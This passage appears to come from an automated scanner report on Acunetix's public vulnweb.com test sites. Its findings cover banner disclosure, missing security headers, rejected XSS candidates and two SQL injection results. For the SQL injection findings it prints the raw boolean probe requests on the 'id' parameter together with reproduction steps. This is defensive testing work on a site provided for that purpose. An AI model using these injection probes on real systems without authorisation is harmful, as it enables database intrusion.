## [TESTASP F31] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/showforum.asp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Microsoft-IIS/8.5
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-a5cb5e92 (exactly as issued by the engine) ---
  GET /showforum.asp?id=2
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 2933
    content-type: text/html
    date: Sat, 03 Oct 2026 01:16:22 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum Miscellaneous</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [38 more lines, 3082 chars total]
  elapsed_ms: 364.5
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/showforum.asp as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASP F32] tech_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/showforum.asp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Technology stack disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] X-Powered-By: ASP.NET
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-a5cb5e92 (exactly as issued by the engine) ---
  GET /showforum.asp?id=2
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 2933
    content-type: text/html
    date: Sat, 03 Oct 2026 01:16:22 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum Miscellaneous</title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" -->\x0d
    <!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    </head>\x0d
    ... [38 more lines, 3082 chars total]
  elapsed_ms: 364.5
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/showforum.asp as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASP F33] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/showthread.asp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Microsoft-IIS/8.5
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-e14f5608 (exactly as issued by the engine) ---
  GET /showthread.asp?id=3
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 4181
    content-type: text/html
    date: Sat, 03 Oct 2026 01:19:35 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum\x0d
    aaa\x0d
    </title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    ... [60 more lines, 4213 chars total]
  elapsed_ms: 352.7
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/showthread.asp as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASP F34] tech_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testasp.vulnweb.com/showthread.asp (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Technology stack disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] X-Powered-By: ASP.NET
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-e14f5608 (exactly as issued by the engine) ---
  GET /showthread.asp?id=3
  headers:
    Cookie: [REDACTED]
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 4181
    content-type: text/html
    date: Sat, 03 Oct 2026 01:19:35 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\x0d
    <html><!-- InstanceBegin template="/Templates/MainTemplate.dwt.asp" codeOutsideHTMLIsLocked="false" -->\x0d
    <head>\x0d
    <!-- InstanceBeginEditable name="doctitle" -->\x0d
    <title>acuforum\x0d
    aaa\x0d
    </title>\x0d
    <!-- InstanceEndEditable -->\x0d
    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">\x0d
    <!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->\x0d
    <link href="styles.css" rel="stylesheet" type="text/css">\x0d
    ... [60 more lines, 4213 chars total]
  elapsed_ms: 352.7
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testasp.vulnweb.com/showthread.asp as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

### rejected candidates (3 — engine-rejected; listed for transparency)
- xss_reflected @ http://testasp.vulnweb.com/Login.asp param `tfUName` — re-test:variant-battery-6: 0/6 diverse vectors reflected raw (WAF-resistant verification)
- xss_reflected @ http://testasp.vulnweb.com/Login.asp param `tfUPass` — re-test:variant-battery-6: 0/6 diverse vectors reflected raw (WAF-resistant verification)
- xss_reflected @ http://testasp.vulnweb.com/Login.asp param `tfUPass` — re-test:variant-battery-6: 0/6 diverse vectors reflected raw (WAF-resistant verification)

---

# TARGET: http://testaspnet.vulnweb.com  (testaspnet)

Authorization basis: Acunetix public test site (vulnweb.com) — explicitly provided for security testing.

Scan record (as-run, unedited):
- run_id: run-3d6cf53f93 | seed: f09afb0f | scanner: sentinel-core/4.2.1
- profile: see the raw scan JSON at build-v421/results/live_v421/testaspnet.json
- requests: 851 | duration: 459.57s | rate_limit: {"limited": 0, "retries": 0, "recovered": 0}
- journal: 851 entries | dropped: 0
- OAST: {}
- engine verdict tally (as-is): 29 findings / 0 rejected / 0 unverified


## [TESTASPNET F01] sql_injection — critical (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/Comments.aspx (parameter: `id`)
- Engine verdict: verified via `oracle:replay-2round` | confidence 0.95 | rounds 2
- Verification notes (engine-recorded): replay TRUE=200 FALSE=200
- Impact (engine-assessed): proven — Attacker influence over query evaluation proven by a non-destructive boolean differential (AND 1=1 vs AND 1=2 yield different application behavior) — a read-capable oracle. Data was never extracted; the capability was demonstrated, not exercised.
- Evidence chain (engine-recorded):
    * [response_diff] body-size differential 23428B vs 13310B on condition flip
    * [response_diff] body-size differential 24314B vs 13310B on condition flip
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-153b292c (exactly as issued by the engine) ---
  GET /Comments.aspx?id=2+AND+1%3D1
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 23428
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:23:06 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>Comments</title>\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [5 more lines, 4048 chars total]
  elapsed_ms: 623.8
  --- RAW REQUEST req-0a92f804 (exactly as issued by the engine) ---
  POST /Comments.aspx?id=0+AND+1%3D1
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 24314
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:27:53 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>Comments</title>\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [5 more lines, 4048 chars total]
  elapsed_ms: 709.3
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/Comments.aspx with the tested parameter 'id' and the canary value from the evidence chain
       expect: the same evidence kind fires as in the attached proof (response_diff)

## [TESTASPNET F02] sql_injection — critical (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/ReadNews.aspx (parameter: `id`)
- Engine verdict: verified via `oracle:replay-2round` | confidence 0.95 | rounds 2
- Verification notes (engine-recorded): replay TRUE=200 FALSE=200
- Impact (engine-assessed): proven — Attacker influence over query evaluation proven by a non-destructive boolean differential (AND 1=1 vs AND 1=2 yield different application behavior) — a read-capable oracle. Data was never extracted; the capability was demonstrated, not exercised.
- Evidence chain (engine-recorded):
    * [response_diff] body-size differential 30615B vs 13505B on condition flip
    * [response_diff] body-size differential 22848B vs 13444B on condition flip
    * [response_diff] body-size differential 22909B vs 13505B on condition flip
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-92386532 (exactly as issued by the engine) ---
  GET /ReadNews.aspx?id=2+AND+1%3D1&NewsAd=ads%2Fdef.html
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 30615
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:23:15 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>ReadNews</title>\x0d
    		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">\x0d
    		<meta content="C#" name="CODE_LANGUAGE">\x0d
    		<meta content="JavaScript" name="vs_defaultClientScript">\x0d
    		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [5 more lines, 4048 chars total]
  elapsed_ms: 724.9
  --- RAW REQUEST req-9bad86a4 (exactly as issued by the engine) ---
  GET /ReadNews.aspx?id=0+AND+1%3D1
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 22848
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:27:44 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>ReadNews</title>\x0d
    		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">\x0d
    		<meta content="C#" name="CODE_LANGUAGE">\x0d
    		<meta content="JavaScript" name="vs_defaultClientScript">\x0d
    		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [5 more lines, 4048 chars total]
  elapsed_ms: 653.3
  --- RAW REQUEST req-8c7c88ff (exactly as issued by the engine) ---
  POST /ReadNews.aspx?id=0+AND+1%3D1&NewsAd=ads%2Fdef.html
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 22909
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:28:55 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>ReadNews</title>\x0d
    		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">\x0d
    		<meta content="C#" name="CODE_LANGUAGE">\x0d
    		<meta content="JavaScript" name="vs_defaultClientScript">\x0d
    		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [5 more lines, 4048 chars total]
  elapsed_ms: 657.1
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/ReadNews.aspx with the tested parameter 'id' and the canary value from the evidence chain
       expect: the same evidence kind fires as in the attached proof (response_diff)

## [TESTASPNET F03] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-632fe5b3 (exactly as issued by the engine) ---
  GET 
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 14045
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:22:55 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>acublog news</title>\x0d
    		<META http-equiv="Content-Type" content="text/html; charset=windows-1252">\x0d
    		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">\x0d
    		<meta content="C#" name="CODE_LANGUAGE">\x0d
    		<meta content="JavaScript" name="vs_defaultClientScript">\x0d
    		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    ... [55 more lines, 4198 chars total]
  elapsed_ms: 513.6
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTASPNET F04] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/styles.css (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-0d12c219 (exactly as issued by the engine) ---
  GET /styles.css
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    accept-ranges: bytes
    content-length: 2597
    content-type: text/css
    date: Sat, 03 Oct 2026 01:22:57 GMT
    etag: "c8c2136e99c1c81:0"
    last-modified: Thu, 29 May 2008 14:36:50 GMT
    server: Microsoft-IIS/8.5
    x-powered-by: ASP.NET
  body:
    body\x0d
    {\x0d
    	padding-right: 0px;\x0d
    	padding-left: 0px;\x0d
    	list-style-position: outside;\x0d
    	background: url(images/background.gif) #e6dccf fixed repeat-y center top;\x0d
    	padding-bottom: 0px;\x0d
    	margin: 0px;\x0d
    	font: small tahoma, "Bitstream Vera Sans" , "Trebuchet MS" , "Lucida Grande" , lucida, helvetica, sans-serif;\x0d
    	padding-top: 0px;\x0d
    	list-style-type: square;\x0d
    }\x0d
    ... [142 more lines, 3056 chars total]
  elapsed_ms: 320.0
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/styles.css as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTASPNET F05] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/about.aspx (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-782955ec (exactly as issued by the engine) ---
  GET /about.aspx
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 14598
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:22:57 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>About</title>\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [55 more lines, 4198 chars total]
  elapsed_ms: 500.6
  --- RAW REQUEST req-84f1e7a6 (exactly as issued by the engine) ---
  POST /about.aspx
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTEwNTI0MjkwNQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkZLDaiLtIJBFGHdHW8BBidJDZ856t&__VIEWSTATEGENERATOR=E809BCA5&__EVENTVALIDATION=%2FwEWVwKqq9H0CQLi%2B%2BjXCAKUlvjlDgK20sH6DwK20sH6DwK20vWRBwK20vWRBwK20qn5BQK20qn5BQK20t2dDQK20t2dDQKL%2Ba8FAov5rwUCi%2FnD2QkCi%2FnD2QkCi%2Fn3%2FAICi%2Fn3%2FAICi%2FnrkwoCi%2FnrkwoCi%2FmftgMCi%2FmftgMCi%2FmzzQwCi%2FmzzQwCi%2Fmn4AUCi%2Fmn4AUCi%2FnbhA0Ci%2FnbhA0Ci%2FmP7AsCi%2FmP7AsCi%2FmjgwMCi%2FmjgwMCvJPvxAkCvJPvxAkCvJODmwECvJODmwECvJO3vgoCvJO3vgoCvJOr1QMCvJOr1QMCvJPf6QwCvJPf6QwCvJPzjAQCvJPzjAQCvJPnow0CvJPnow0CvJObxgYCvJObxgYCvJPPrwMCvJPPrwMCvJPjwgwCvJPjwgwCkbrN6w8CkbrN6w8CkbrhjgcCkbrhjgcCkbqVJQKRupUlApG6ifgJApG6ifgJApG6vZ8BApG6vZ8BApG60bMKApG60bMKApG6xdYDApG6xdYDApG6%2Be0MApG6%2Be0MApG6rdUJApG6rdUJApG6wekCApG6wekCAtTZwJ4HAtTZwJ4HAtTZ9DUC1Nn0NQLU2ejICQLU2ejICQLU2ZzvAgLU2ZzvAgLU2bCCCgLU2bCCCgLU2aTZAwLU2aTZAwLU2dj9DALU2dj9DALU2cyQBALU2cyQBOD%2BngBvTAKQTfFkI343BDtC1BPe
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 14598
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:24:31 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>About</title>\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [55 more lines, 4198 chars total]
  elapsed_ms: 491.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/about.aspx as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [TESTASPNET F06] missing_security_headers — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/default.aspx (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-frame-options, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-f4358432 (exactly as issued by the engine) ---
  GET /default.aspx
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 14045
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:22:58 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>acublog news</title>\x0d
    		<META http-equiv="Content-Type" content="text/html; charset=windows-1252">\x0d
    		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">\x0d
    		<meta content="C#" name="CODE_LANGUAGE">\x0d
    		<meta content="JavaScript" name="vs_defaultClientScript">\x0d
    		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    ... [55 more lines, 4198 chars total]
  elapsed_ms: 514.7
  --- RAW REQUEST req-3a1f4ead (exactly as issued by the engine) ---
  POST /default.aspx
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
